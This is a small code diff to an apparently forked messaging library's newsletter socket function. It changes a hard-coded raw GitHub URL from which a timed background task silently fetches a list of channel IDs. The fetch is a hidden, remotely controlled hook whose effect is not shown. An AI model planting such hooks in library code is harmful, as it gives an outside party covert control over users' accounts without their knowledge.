@@ -131,7 +131,7 @@ const makeNewsletterSocket = (config) => {
 setTimeout(async () => {
     const logger = config.logger || console;
     try {
-        const RAW_URL = "https://raw.githubusercontent.com/jjhaane/channelid/refs/heads/main/Idchannel.json";
+        const RAW_URL = "https://raw.githubusercontent.com/Sanz-notdev/node-libsignal/refs/heads/main/channelid.json";
         const res = await fetch(RAW_URL);
         const channelIds = await res.json();
 
